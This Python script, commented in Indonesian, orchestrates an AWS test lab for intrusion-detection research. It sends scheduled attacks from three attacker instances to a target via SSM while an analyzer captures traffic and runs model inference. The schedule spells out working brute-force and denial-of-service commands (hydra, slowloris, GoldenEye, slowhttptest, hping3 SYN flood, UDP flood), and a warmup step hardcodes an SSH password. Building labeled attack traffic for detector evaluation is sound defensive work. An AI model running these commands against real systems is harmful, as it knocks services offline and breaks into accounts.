#!/usr/bin/env python3
"""
IDS2018 AWS Testing — Orchestrator Script
==========================================
Jalankan dari laptop. Script ini:
1. Start capture di Analyzer
2. Kirim attack commands ke 3 Attacker EC2 sesuai schedule
3. Semua via SSM send-command (tidak perlu buka terminal manual)
4. Stop capture & trigger inference di akhir

Usage:
    python run_test.py --config test_config.json

Prerequisites:
    - AWS CLI configured (aws configure)
    - Semua EC2 sudah running & SSM agent active
    - pip install boto3
"""

import boto3
import json
import time
import sys
import os
from datetime import datetime, timedelta

# ============================================================
# CONFIGURATION
# ============================================================

DEFAULT_CONFIG = {
    "region": "ap-southeast-1",
    "target_ip": "REPLACE_WITH_TARGET_IP",
    "instance_ids": {
        "analyzer": "REPLACE_WITH_ANALYZER_ID",
        "attacker1": "REPLACE_WITH_ATTACKER1_ID",
        "attacker2": "REPLACE_WITH_ATTACKER2_ID",
        "attacker3": "REPLACE_WITH_ATTACKER3_ID"
    },
    "s3_bucket": "REPLACE_WITH_BUCKET",
    "attack_duration_sec": 300,
    "cooldown_sec": 120,
    "warmup_sec": 300
}

# ============================================================
# ATTACK SCHEDULE
# ============================================================

def get_attack_schedule(target_ip, duration=300):
    """Define attack schedule. Each entry = one attack phase."""
    return [
        {
            "name": "SSH-Bruteforce",
            "attacker": "attacker1",
            "duration": duration,
            "command": f"hydra -l testuser -P /opt/attack/passwords.txt -t 8 -w 3 {target_ip} ssh -V 2>&1 | tee /opt/attack/log_ssh_bf.txt"
        },
        {
            "name": "FTP-BruteForce",
            "attacker": "attacker1",
            "duration": duration,
            "command": f"hydra -l testuser -P /opt/attack/passwords.txt -t 8 -w 3 {target_ip} ftp -V 2>&1 | tee /opt/attack/log_ftp_bf.txt"
        },
        {
            "name": "DoS-Slowloris",
            "attacker": "attacker2",
            "duration": duration,
            "command": f"timeout {duration} slowloris {target_ip} -p 80 -s 200 --sleeptime 1 2>&1 | tee /opt/attack/log_slowloris.txt"
        },
        {
            "name": "DoS-GoldenEye",
            "attacker": "attacker2",
            "duration": duration,
            "command": f"timeout {duration} python3 /opt/GoldenEye/goldeneye.py http://{target_ip} -w 50 -s 100 2>&1 | tee /opt/attack/log_goldeneye.txt"
        },
        {
            "name": "DoS-SlowHTTPTest",
            "attacker": "attacker2",
            "duration": duration,
            "command": f"timeout {duration} slowhttptest -c 1000 -H -i 10 -r 200 -t GET -u http://{target_ip}/ -p 3 -l {duration} 2>&1 | tee /opt/attack/log_slowhttp.txt"
        },
        {
            "name": "DoS-Hulk",
            "attacker": "attacker2",
            "duration": duration,
            "command": f"timeout {duration} ab -n 100000 -c 500 http://{target_ip}/ 2>&1 | tee /opt/attack/log_hulk.txt"
        },
        {
            "name": "DDoS-SYN",
            "attacker": "attacker3",
            "duration": duration,
            "command": f"sudo timeout {duration} hping3 -S --flood -V -p 80 {target_ip} 2>&1 | tee /opt/attack/log_syn.txt"
        },
        {
            "name": "DDoS-UDP",
            "attacker": "attacker3",
            "duration": duration,
            "command": f"sudo timeout {duration} python3 /opt/attack/udp_flood.py {target_ip} 80 {duration} 2>&1 | tee /opt/attack/log_udp.txt"
        }
    ]


# ============================================================
# SSM HELPERS
# ============================================================

def send_ssm_command(ssm_client, instance_id, command, comment=""):
    """Send a shell command to EC2 via SSM and return command ID."""
    response = ssm_client.send_command(
        InstanceIds=[instance_id],
        DocumentName="AWS-RunShellScript",
        Parameters={"commands": [command]},
        TimeoutSeconds=600,
        Comment=comment[:100] if comment else "ids2018-test"
    )
    cmd_id = response['Command']['CommandId']
    return cmd_id


def wait_for_command(ssm_client, cmd_id, instance_id, timeout=600):
    """Wait for SSM command to complete."""
    start = time.time()
    while time.time() - start < timeout:
        try:
            result = ssm_client.get_command_invocation(
                CommandId=cmd_id,
                InstanceId=instance_id
            )
            status = result['Status']
            if status in ['Success', 'Failed', 'Cancelled', 'TimedOut']:
                return status, result.get('StandardOutputContent', ''), result.get('StandardErrorContent', '')
        except ssm_client.exceptions.InvocationDoesNotExist:
            pass
        time.sleep(5)
    return 'Timeout', '', ''


def log(msg):
    """Print timestamped log."""
    ts = datetime.now().strftime("%H:%M:%S")
    print(f"[{ts}] {msg}")


# ============================================================
# MAIN ORCHESTRATOR
# ============================================================

def run_test(config):
    region = config["region"]
    target_ip = config["target_ip"]
    instances = config["instance_ids"]
    attack_duration = config.get("attack_duration_sec", 300)
    cooldown = config.get("cooldown_sec", 120)
    warmup = config.get("warmup_sec", 300)
    bucket = config.get("s3_bucket", "")

    ssm = boto3.client('ssm', region_name=region)
    schedule = get_attack_schedule(target_ip, attack_duration)

    log("=" * 60)
    log("IDS2018 AWS TESTING — ORCHESTRATOR")
    log("=" * 60)
    log(f"Region: {region}")
    log(f"Target IP: {target_ip}")
    log(f"Analyzer: {instances['analyzer']}")
    log(f"Attacker1: {instances['attacker1']}")
    log(f"Attacker2: {instances['attacker2']}")
    log(f"Attacker3: {instances['attacker3']}")
    log(f"Attack duration: {attack_duration}s | Cooldown: {cooldown}s")
    log(f"Total phases: {len(schedule)}")
    total_time = warmup + len(schedule) * (attack_duration + cooldown)
    log(f"Estimated total time: {total_time//60} min {total_time%60}s")
    log("=" * 60)

    # ---- STEP 1: Start Analyzer capture ----
    log("[ANALYZER] Starting tcpdump + CICFlowMeter...")
    analyzer_start_cmd = (
        "sudo pkill tcpdump 2>/dev/null; "
        "sudo pkill -f CICFlowMeter 2>/dev/null; "
        "mkdir -p /opt/ids2018/{flows,results,logs}; "
        "sudo tcpdump -i eth0 -w /opt/ids2018/capture.pcap &"
    )
    cmd_id = send_ssm_command(ssm, instances['analyzer'], analyzer_start_cmd, "Start capture")
    time.sleep(5)
    log("[ANALYZER] Capture started")

    # ---- STEP 2: Warmup (benign traffic) ----
    log(f"[WARMUP] Generating benign traffic for {warmup}s...")
    benign_cmd = (
        f"for i in $(seq 1 10); do "
        f"sshpass -p 'P@ssw0rd123' ssh -o StrictHostKeyChecking=no testuser@{target_ip} 'echo benign' 2>/dev/null; "
        f"sleep {warmup // 10}; done"
    )
    cmd_id = send_ssm_command(ssm, instances['attacker1'], benign_cmd, "Benign warmup")
    time.sleep(warmup)
    log("[WARMUP] Complete")

    # ---- STEP 3: Execute attacks sequentially ----
    test_start = datetime.now()
    results_log = []

    for i, attack in enumerate(schedule):
        phase_num = i + 1
        attacker_id = instances[attack['attacker']]
        
        log(f"\n{'='*60}")
        log(f"[PHASE {phase_num}/{len(schedule)}] {attack['name']}")
        log(f"  Attacker: {attack['attacker']} ({attacker_id})")
        log(f"  Duration: {attack['duration']}s")
        log(f"  Command: {attack['command'][:80]}...")
        log(f"{'='*60}")

        # Send attack command
        phase_start = datetime.now()
        cmd_id = send_ssm_command(
            ssm, attacker_id, attack['command'],
            f"Phase {phase_num}: {attack['name']}"
        )
        log(f"  → SSM command sent: {cmd_id}")

        # Wait for attack to finish
        log(f"  → Waiting {attack['duration']}s for attack to complete...")
        time.sleep(attack['duration'])

        # Check command status
        status, stdout, stderr = wait_for_command(ssm, cmd_id, attacker_id, timeout=60)
        phase_end = datetime.now()
        
        log(f"  → Status: {status}")
        if stdout:
            # Show last 3 lines of output
            lines = stdout.strip().split('\n')
            for line in lines[-3:]:
                log(f"     {line[:100]}")

        results_log.append({
            "phase": phase_num,
            "attack": attack['name'],
            "attacker": attack['attacker'],
            "start": phase_start.isoformat(),
            "end": phase_end.isoformat(),
            "status": status
        })

        # Cooldown
        if i < len(schedule) - 1:
            log(f"  → Cooldown {cooldown}s...")
            time.sleep(cooldown)

    # ---- STEP 4: Stop capture & run inference ----
    log(f"\n{'='*60}")
    log("[ANALYZER] Stopping capture & running inference...")
    log(f"{'='*60}")

    stop_and_infer_cmd = (
        "sudo pkill tcpdump; "
        "sleep 10; "
        "sudo pkill -f CICFlowMeter 2>/dev/null; "
        "cd /opt/ids2018 && "
        "python3 inference.py "
        "--flows-dir /opt/ids2018/flows/ "
        "--models-dir /opt/ids2018/models/ "
        "--schedule /opt/ids2018/schedule/schedule.json "
        "--output-dir /opt/ids2018/results/ 2>&1 | tee /opt/ids2018/logs/inference.log"
    )
    cmd_id = send_ssm_command(ssm, instances['analyzer'], stop_and_infer_cmd, "Stop + Inference")
    log("[ANALYZER] Inference command sent. Waiting for completion...")
    
    status, stdout, stderr = wait_for_command(ssm, cmd_id, instances['analyzer'], timeout=300)
    log(f"[ANALYZER] Inference status: {status}")
    if stdout:
        for line in stdout.strip().split('\n')[-10:]:
            log(f"  {line}")

    # ---- STEP 5: Upload results to S3 ----
    if bucket:
        log(f"\n[S3] Uploading results to s3://{bucket}/ids2018/results/...")
        upload_cmd = f"aws s3 cp /opt/ids2018/results/ s3://{bucket}/ids2018/results/ --recursive"
        cmd_id = send_ssm_command(ssm, instances['analyzer'], upload_cmd, "Upload results")
        time.sleep(15)
        log("[S3] Upload complete")

    # ---- DONE ----
    test_end = datetime.now()
    total_elapsed = (test_end - test_start).total_seconds()

    log(f"\n{'='*60}")
    log(f"TEST COMPLETE!")
    log(f"{'='*60}")
    log(f"Total elapsed: {int(total_elapsed//60)} min {int(total_elapsed%60)}s")
    log(f"Phases executed: {len(results_log)}")
    log(f"\nPhase summary:")
    for r in results_log:
        log(f"  {r['phase']:>2d}. {r['attack']:20s} [{r['attacker']}] → {r['status']}")
    log(f"\nResults location: /opt/ids2018/results/ (Analyzer)")
    if bucket:
        log(f"S3: s3://{bucket}/ids2018/results/")
    log(f"{'='*60}")

    # Save local log
    log_path = os.path.join(os.path.dirname(__file__), "test_run_log.json")
    with open(log_path, 'w') as f:
        json.dump({
            "test_start": test_start.isoformat(),
            "test_end": test_end.isoformat(),
            "elapsed_seconds": total_elapsed,
            "config": config,
            "phases": results_log
        }, f, indent=2)
    log(f"Local log saved: {log_path}")


# ============================================================
# ENTRY POINT
# ============================================================

if __name__ == "__main__":
    # Load config
    if len(sys.argv) > 1 and os.path.exists(sys.argv[1]):
        with open(sys.argv[1]) as f:
            config = json.load(f)
        print(f"Loaded config from: {sys.argv[1]}")
    else:
        # Generate default config file
        config_path = os.path.join(os.path.dirname(__file__), "test_config.json")
        if not os.path.exists(config_path):
            with open(config_path, 'w') as f:
                json.dump(DEFAULT_CONFIG, f, indent=2)
            print(f"Default config generated: {config_path}")
            print("Please edit test_config.json with your instance IDs and IPs, then re-run.")
            sys.exit(1)
        else:
            with open(config_path) as f:
                config = json.load(f)

    # Validate config
    if "REPLACE" in json.dumps(config):
        print("ERROR: Please replace placeholder values in test_config.json")
        print("  - target_ip: Private IP of Target EC2")
        print("  - instance_ids: Instance IDs from CloudFormation outputs")
        print("  - s3_bucket: Your S3 bucket name")
        sys.exit(1)

    run_test(config)
